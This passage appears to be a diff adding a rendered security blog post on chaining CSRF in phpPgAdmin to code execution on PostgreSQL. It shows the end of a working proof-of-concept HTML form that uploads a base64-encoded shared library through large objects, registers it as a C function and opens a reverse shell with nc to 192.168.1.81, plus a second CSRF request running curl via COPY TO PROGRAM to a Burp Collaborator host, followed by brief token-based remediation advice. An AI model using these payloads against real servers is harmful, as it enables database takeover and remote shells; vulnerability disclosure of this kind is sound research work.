+AAwAUAOAPIAAAAAAAAAAAAAAAAAAAAAAAAwAVAAAQIAAAAAAAAAAAAAAAAAAAAAAAAwAWACAQIAAAAAAAAAAAAAAAAAAAAA
+AAAwAXACgQIAAAAAAAAAAAAAAAAAAAAAAAAwAYAAAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMA
+AAAAgAMAJAFAAAAAAAAAAAAAAAAAAAOAAAAAgAMANAFAAAAAAAAAAAAAAAAAAAhAAAAAgAMACAGAAAAAAAAAAAAAAAAAAA3
+AAAAAQAXACgQIAAAAAAAAQAAAAAAAABGAAAAAQASABgOIAAAAAAAAAAAAAAAAABtAAAAAgAMAGAGAAAAAAAAAAAAAAAAAAB
+5AAAAAQARABAOIAAAAAAAAAAAAAAAAACYAAAABADx/wAAAAAAAAAAAAAAAAAAAACiAAAAAQAOAMAGAAAAAAAAHAAAAAAAAA
+C1AAAAAQAOANwGAAAAAAAABAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAADDAAAAAQAQANAHAAAAAAAAAAAAAAAAA
+AAAAAAABADx/wAAAAAAAAAAAAAAAAAAAADRAAAAAQAWACAQIAAAAAAAAAAAAAAAAADeAAAAAQATACAOIAAAAAAAAAAAAAAA
+AADnAAAAAAAPAOAGAAAAAAAAAAAAAAAAAAD6AAAAAQAWACgQIAAAAAAAAAAAAAAAAAAGAQAAAQAVAAAQIAAAAAAAAAAAAAA
+AAAAcAQAAEgAMAGoGAAAAAAAADQAAAAAAAAAqAQAAIAAAAAAAAAAAAAAAAAAAAAAAAABGAQAAEAAWACgQIAAAAAAAAAAAAA
+AAAABNAQAAEgANALAGAAAAAAAAAAAAAAAAAABTAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABnAQAAIAAAAAAAAAAAAAAAAAAAA
+AAAAACQAQAAEgAMAIQGAAAAAAAAKgAAAAAAAAB2AQAAEAAXADAQIAAAAAAAAAAAAAAAAAB7AQAAEAAXACgQIAAAAAAAAAAA
+AAAAAACHAQAAEgAMAHcGAAAAAAAADQAAAAAAAACYAQAAIAAAAAAAAAAAAAAAAAAAAAAAAACyAQAAIgAAAAAAAAAAAAAAAAA
+AAAAAAADOAQAAEgAJAEAFAAAAAAAAAAAAAAAAAAAAY3J0c3R1ZmYuYwBkZXJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2
+JhbF9kdG9yc19hdXgAY29tcGxldGVkLjc2OTYAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhb
+WVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AHBnX2V4ZWMuYwBQZ19tYWdpY19kYXRhLjQ3NzkAbXlf
+ZmluZm8uNDc4OABfX0ZSQU1FX0VORF9fAF9fZHNvX2hhbmRsZQBfRFlOQU1JQwBfX0dOVV9FSF9GUkFNRV9IRFIAX19UTUN
+fRU5EX18AX0dMT0JBTF9PRkZTRVRfVEFCTEVfAFBnX21hZ2ljX2Z1bmMAX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxlAF
+9lZGF0YQBfZmluaQBzeXN0ZW1AQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAF9lbmQAX19ic3Nfc3RhcnQAcGdfZmluZ
+m9fcGdfZXhlYwBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEBHTElCQ18yLjIuNQBfaW5pdAAA
+LnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgA
+uZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbGEuZHluAC5yZWxhLnBsdAAuaW5pdAAucGx0Lmc=\',
+\'base64\'));\r\n"</span> <span class="o">+</span>
+<span class="s2">"INSERT INTO pg_largeobject (loid, pageno, data) values (43213, 3,
+decode(\'b3QALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV
+9hcnJheQAuZHluYW1pYwAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAAAABwAAAAIAAAAAAAAAyAEAAAAAAADIAQAAAAAA
+ACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAALgAAAPb//28CAAAAAAAAAPABAAAAAAAA8AEAAAAAAABEAAAAAAA
+AAAMAAAAAAAAACAAAAAAAAAAAAAAAAAAAADgAAAALAAAAAgAAAAAAAAA4AgAAAAAAADgCAAAAAAAAUAEAAAAAAAAEAAAAAQ
+AAAAgAAAAAAAAAGAAAAAAAAABAAAAAAwAAAAIAAAAAAAAAiAMAAAAAAACIAwAAAAAAALUAAAAAAAAAAAAAAAAAAAABAAAAA
+AAAAAAAAAAAAAAASAAAAP///28CAAAAAAAAAD4EAAAAAAAAPgQAAAAAAAAcAAAAAAAAAAMAAAAAAAAAAgAAAAAAAAACAAAA
+AAAAAFUAAAD+//9vAgAAAAAAAABgBAAAAAAAAGAEAAAAAAAAIAAAAAAAAAAEAAAAAQAAAAgAAAAAAAAAAAAAAAAAAABkAAA
+ABAAAAAIAAAAAAAAAgAQAAAAAAACABAAAAAAAAKgAAAAAAAAAAwAAAAAAAAAIAAAAAAAAABgAAAAAAAAAbgAAAAQAAABCAA
+AAAAAAACgFAAAAAAAAKAUAAAAAAAAYAAAAAAAAAAMAAAAVAAAACAAAAAAAAAAYAAAAAAAAAHgAAAABAAAABgAAAAAAAABAB
+QAAAAAAAEAFAAAAAAAAFwAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABzAAAAAQAAAAYAAAAAAAAAYAUAAAAAAABg
+BQAAAAAAACAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAfgAAAAEAAAAGAAAAAAAAAIAFAAAAAAAAgAUAAAAAAAA
+IAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAIcAAAABAAAABgAAAAAAAACQBQAAAAAAAJAFAAAAAAAAHgEAAAAAAA
+AAAAAAAAAAABAAAAAAAAAAAAAAAAAAAACNAAAAAQAAAAYAAAAAAAAAsAYAAAAAAACwBgAAAAAAAAkAAAAAAAAAAAAAAAAAA
+AAEAAAAAAAAAAAAAAAAAAAAkwAAAAEAAAACAAAAAAAAAMAGAAAAAAAAwAYAAAAAAAAgAAAAAAAAAAAAAAAAAAAAEAAAAAAA
+AAAAAAAAAAAAAJsAAAABAAAAAgAAAAAAAADgBgAAAAAAAOAGAAAAAAAANAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAA
+AAACpAAAAAQAAAAIAAAAAAAAAGAcAAAAAAAAYBwAAAAAAALwAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAswAAAA
+4AAAADAAAAAAAAABAOIAAAAAAAEA4AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAL8AAAAPAAAAAwAAA
+AAAAAAYDiAAAAAAABgOAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADLAAAABgAAAAMAAAAAAAAAIA4g
+AAAAAAAgDgAAAAAAAMABAAAAAAAABAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAggAAAAEAAAADAAAAAAAAAOAPIAAAAAAA4A8
+AAAAAAAAgAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAANQAAAABAAAAAwAAAAAAAAAAECAAAAAAAAAQAAAAAAAAIA
+AAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADdAAAAAQAAAAMAAAAAAAAAIBAgAAAAAAAgEAAAAAAAAAgAAAAAAAAAA
+AAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA4wAAAAgAAAADAAAAAAAAACgQIAAAAAAAKBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA
+AQAAAAAAAAAAAAAAAAAAAOgAAAABAAAAMAAAAAAAAAAAAAAAAAAAACgQAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAEAAAAAAAA
+AAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAABQEAAAAAAAAFgFAAAAAAAAGgAAACwAAAAIAAAAAAAAABgAAAAAAA
+AACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAqBUAAAAAAADUAQAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADA
+AAAAAAAAAAAAAAAAAAAAAAAAHwXAAAAAAAA8QAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=\',
+\'base64\'));\r\n"</span> <span class="o">+</span>
+<span class="s2">"SELECT lo_export(43213, \'/tmp/pg_exec.so\');\r\n"</span> <span class="o">+</span>
+<span class="s2">"CREATE FUNCTION sys(cstring) RETURNS int AS \'/tmp/pg_exec.so\', \'pg_exec\'
+LANGUAGE \'c\' STRICT;\r\n"</span> <span class="o">+</span>
+<span class="s2">"SELECT sys(\'mknod /tmp/backpipe p\');\r\n"</span> <span class="o">+</span>
+<span class="s2">"SELECT sys(\'/bin/sh 0\x3c/tmp/backpipe | nc 192.168.1.81 80
+1\x3e/tmp/backpipe\');\r\n"</span> <span class="o">+</span>
+<span class="s2">"-----------------------------297112967428312\r\n"</span> <span class="o">+</span>
+<span class="s2">"Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n"</span> <span class="o">+</span>
+<span class="s2">"\r\n"</span> <span class="o">+</span>
+<span class="s2">"2097152\r\n"</span> <span class="o">+</span>
+<span class="s2">"-----------------------------297112967428312\r\n"</span> <span class="o">+</span>
+<span class="s2">"Content-Disposition: form-data; name=\"script\"; filename=\"\"\r\n"</span> <span class="o">+</span>
+<span class="s2">"Content-Type: application/octet-stream\r\n"</span> <span class="o">+</span>
+<span class="s2">"\r\n"</span> <span class="o">+</span>
+<span class="s2">"\r\n"</span> <span class="o">+</span>
+<span class="s2">"-----------------------------297112967428312\r\n"</span> <span class="o">+</span>
+<span class="s2">"Content-Disposition: form-data; name=\"execute\"\r\n"</span> <span class="o">+</span>
+<span class="s2">"\r\n"</span> <span class="o">+</span>
+<span class="s2">"Execute\r\n"</span> <span class="o">+</span>
+<span class="s2">"-----------------------------297112967428312\r\n"</span> <span class="o">+</span>
+<span class="s2">"Content-Disposition: form-data; name=\"server\"\r\n"</span> <span class="o">+</span>
+<span class="s2">"\r\n"</span> <span class="o">+</span>
+<span class="s2">"localhost:5432:allow\r\n"</span> <span class="o">+</span>
+<span class="s2">"-----------------------------297112967428312\r\n"</span> <span class="o">+</span>
+<span class="s2">"Content-Disposition: form-data; name=\"database\"\r\n"</span> <span class="o">+</span>
+<span class="s2">"\r\n"</span> <span class="o">+</span>
+<span class="s2">"postgres\r\n"</span> <span class="o">+</span>
+<span class="s2">"-----------------------------297112967428312--\r\n"</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">aBody</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">aBody</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
+<span class="nx">aBody</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">body</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span><span class="nx">aBody</span><span class="p">]));</span>
+<span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"#"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="na">onclick=</span><span class="s">"submitRequest();"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre>
+</div>
+
+<h2 id="csrf-2">CSRF 2</h2>
+
+<p>The following request was also found to be vulnerable to CSRF.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST /phpad/sql.php HTTP/1.1
+Host: 192.168.1.82
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 181
+Cookie: PPA_ID=hpgneejqaotogcv6ib6lv9ajpb;
+webfx-tree-cookie-persistence=wfxt-4+wfxt-6+wfxt-8+wfxt-10+wfxt-12
+Connection: close
+server=localhost%3A5432%3Aallow&amp;database=&amp;search_path=public&amp;query=copy+%28select+%27%27%29+to+
+program+%27curl+http%3A%2F%2Fjobo9rr2vb8jb48i6jge9vy9c0iq6f.burpcollaborator.net%27
+</code></pre>
+</div>
+
+<h2 id="remediation">Remediation</h2>
+
+<p>To ensure that all requests originate from the user knowingly interacting with the application, each request to a sensitive function should include a single-use authentication token. Such tokens are normally included on each page in a hidden form field, which would be included in the request when the form is submitted. The server keeps a copy of the token valid for the user’s session, and checks if the two values match after receiving the request. The tokens often consist of twenty or more random characters, an example of which is given below.</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>8D086769FC4B3B058F7FCB0BB37645BA77444AFA
+</code></pre>
+</div>
+
+<h2 id="further-information">Further Information</h2>
+<ul>
+  <li><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery(CSRF)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet</a></li>
+</ul>
+
+</article>
+
+
+
+
+
+<section class="rss">
+  <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
+</section>
+
+<section class="share">
+  <span>Share: </span>
+  
+    
+    
+      <a href="//twitter.com/share?text=phppgadmin+CSRF+to+Code+Execution&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fweb-application-security%2F2018%2F07%2F28%2F28_phppgadmin_csrf_to_code-execution.html&via=snoopysecurity"
+        onclick="window.open(this.href, 'twitter-share', 'width=550,height=255');return false;">
+        <i class="fa fa-twitter-square fa-lg"></i>
+      </a>
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+      <a href="//www.facebook.com/sharer.php?t=phppgadmin+CSRF+to+Code+Execution&u=http%3A%2F%2Fsnoopysecurity.github.io%2Fweb-application-security%2F2018%2F07%2F28%2F28_phppgadmin_csrf_to_code-execution.html"
+        onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
+        <i class="fa fa-facebook-square fa-lg"></i>
+      </a>
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+      <a href="//www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fweb-application-security%2F2018%2F07%2F28%2F28_phppgadmin_csrf_to_code-execution.html"
+        onclick="window.open(this.href, 'linkedin-share', 'width=550,height=255');return false;">
+        <i class="fa fa-linkedin-square fa-lg"></i>
+      </a>
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+      <a href="//www.pinterest.com/pin/create/button/?description=phppgadmin+CSRF+to+Code+Execution&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fweb-application-security%2F2018%2F07%2F28%2F28_phppgadmin_csrf_to_code-execution.html&media=http://snoopysecurity.github.io/assets/header_img.jpg"
+        onclick="window.open(this.href, 'pinterest-share', 'width=550,height=255');return false;">
+        <i class="fa fa-pinterest-square fa-lg"></i>
+      </a>
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+</section>
+
+
+
+
+</div>
+</div>
+
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h3 class="footer-heading">💻 | Blog</h3>
+
+    <div class="site-navigation">
+
+      <p><strong>Site Map</strong></p>
+      <ul class="pages">
+        
+        
+          <li class="nav-link"><a href="/about/">About</a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+          <li class="nav-link"><a href="/posts/">Posts</a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+      </ul>
+    </div>
+
+    <div class="site-contact">
+
+      <p><strong>Contact</strong></p>
+      <ul class="social-media-list">
+        <li>
+          <a href="mailto:na">
+            <i class="fa fa-envelope-o"></i>
+            <span class="username">na</span>
+          </a>
+        </li>
+
+        
+          
+          <li>
+            <a href="https://twitter.com/snoopysecurity" title="Follow me on Twitter">
+              <i class="fa fa-twitter"></i>
+              <span class="username">snoopysecurity</span>
+            </a>
+          </li>
+          
+        
+          
+        
+          
+          <li>
+            <a href="https://github.com/snoopysecurity" title="Fork me on GitHub">
+              <i class="fa fa-github"></i>
+              <span class="username">snoopysecurity</span>
+            </a>
+          </li>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+
+      </ul>
+    </div>
+
+    <div class="site-signature">
+      <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
+      <p class="text">Hacking to learn, while learning to hack.
+</p>
+    </div>
+
+  </div>
+
+</footer>
+
+<!-- Scripts -->
+<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/highlight.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/js/lightbox.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function() {
+  // Default syntax highlighting
+  hljs.initHighlightingOnLoad();
+
+  // Header
+  var menuToggle = $('#js-mobile-menu').unbind();
+  $('#js-navigation-menu').removeClass("show");
+  menuToggle.on('click', function(e) {
+    e.preventDefault();
+    $('#js-navigation-menu').slideToggle(function(){
+      if($('#js-navigation-menu').is(':hidden')) {
+        $('#js-navigation-menu').removeAttr('style');
+      }
+    });
+  });
+});
+
+</script>
+
+
+
+
+
+
+  </body>
+
+</html>
